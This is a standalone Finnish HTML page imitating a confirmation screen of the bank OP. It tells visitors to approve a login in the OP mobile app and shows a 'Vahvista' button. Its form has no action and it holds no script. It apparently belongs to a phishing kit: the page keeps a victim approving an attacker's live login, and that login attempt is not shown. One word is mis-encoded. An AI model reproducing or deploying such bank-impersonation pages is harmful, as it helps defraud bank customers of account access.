<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OP - Vahvistus</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 450px;
            padding: 0;
            position: relative;
            overflow: hidden;
        }

        .login-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 28px;
            border-bottom: 1px solid #e5e7eb;
        }

        .login-title {
            font-size: 24px;
            font-weight: 600;
            color: #111827;
        }

        .login-content {
            padding: 28px;
        }

        .info-text {
            font-size: 15px;
            color: #374151;
            margin-bottom: 24px;
            line-height: 1.6;
            text-align: center;
        }

        .app-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, #ff6b35, #ff8c5a);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 24px rgba(255, 107, 53, 0.3);
        }

        .app-icon svg {
            width: 48px;
            height: 48px;
            color: white;
        }

        .confirm-btn {
            width: 100%;
            padding: 14px;
            background: #ff6b35;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
        }

        .confirm-btn:hover {
            background: #e55a2b;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
        }

        .confirm-btn:active {
            transform: translateY(0);
        }

        .help-text {
            font-size: 13px;
            color: #6b7280;
            margin-top: 16px;
            text-align: center;
        }

        @media (max-width: 480px) {
            .login-container {
                max-width: 100%;
                border-radius: 12px;
            }

            .login-header {
                padding: 20px;
            }

            .login-content {
                padding: 24px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2 class="login-title">Vahvistus</h2>
        </div>

        <div class="login-content">
            <form id="opConfirmForm">
                <div class="app-icon">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                </div>

                <div class="info-text">
                    Vahvista kirjautuminen OP-mobiilisovelluksessasi.
                </div>

                <button type="submit" class="confirm-btn">Vahvista</button>

                <div class="help-text">
                    Avaa OP-mobiilisovellus ja hyv√§ksy kirjautuminen.
                </div>
            </form>
        </div>
    </div>
</body>
</html>
